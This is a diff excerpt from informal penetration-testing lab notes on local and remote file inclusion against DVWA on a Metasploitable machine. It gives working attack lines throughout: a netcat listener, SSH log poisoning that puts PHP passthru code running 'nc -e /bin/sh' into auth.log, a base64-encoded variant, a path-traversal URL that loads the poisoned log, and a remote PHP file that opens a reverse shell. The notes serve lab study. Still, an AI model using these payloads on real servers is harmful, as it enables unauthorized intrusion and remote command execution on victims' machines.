@@ -243,26 +243,29 @@ ur invalid user and also show the IP address
 cmds -> nc -vv -l -p 8080 // in the attacker terminal 1
 cmds -> ssh "<?passthru('nc -e /bin/sh attacker_ip 8000');?>"@victim_ip // in the attacker terminal 2, u only got one shot so make
 sure ur cmd is correct , here in place of username I am putting PHP code it could be any code
-// In the burp suite go to the decoder tab enter this nc -e /bin/sh 10.0.2.15 8000 then encode it as base64, copy the base64 string
-and then replace the cmd string with the base64 string, this makes sure that their is no kind of special character that would 
+// In the burp suite go to the "decoder" tab enter this nc -e /bin/sh 10.0.2.15 8000 then encode it as base64, copy the base64
+string and then replace the cmd string with the base64 string, this makes sure that their is no kind of special character that would 
 interfer with cmd also use base64_decode method as like -> ssh "<?passthru(base64_decode("base64_converted_code"));?>"@10.0.2.15
 - then enter any password now this ssh cmd should be injected in auth.log file, So now enter in the URL ->
-	10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log
+	10.0.2.4/dvwa/vulnerabilities/fi/?page=/../../../../../var/log/auth.log // and u will see the connection is established
 
 // why r we using above steps like this bcz as we see earlier that the username get to go inside the logs that's why we r using 
 code in place of username
 
-#(04) Remote File Inclusion -> It is a special case of Local File Inclusion vulnebilities, In this if the server allows u for 
+#(04) Remote File Inclusion -> Screenshot(472)
+It is a special case of Local File Inclusion vulnebilities, In this if the server allows u for 
 certain functions(Allow URL) then we will be able to include any file from any computer into target computer, So it is like Local
 File Inclusion allows u to access local Files and Remote allows u to access and inject remote files
-Steps to enable Remote File Inclusion ->
+
+Step1 - to enable Remote File Inclusion ->
 - Go to metasploit machine terminal cmds -> cd /root
 - cmd ->sudo nano /etc/php5/cgi/php.ini // this is for the php settings
 - use ctrl+w to search allow_url and then check if the allow_url_fopen is On or not and also check the same for the 
 allow_url_include, if these two r on then we can use the local file inclusion vulnebility as remote file inclusion
 - If u have done the changes then after exit form nano u need to fire cmd ->sudo /etc/init.d/apache2 restart // to restart server
-- Now we r going to access a file on the different server, if this pentest is happening on the actual web server that the file needs
-to be stored in a place with real IP address or domain name, here we r doing it on the local server
+
+Step 2 - Now we r going to access a file on the different server, if this pentest is happening on the actual web server that the
+file needs to be stored in a place with real IP address or domain name, here we r doing it on the local server
 - In the attacker machine write a file using leafpad or any editor as following code in it
  <?php
  passthru("nc -e /bin/sh 10.20.14 8080");
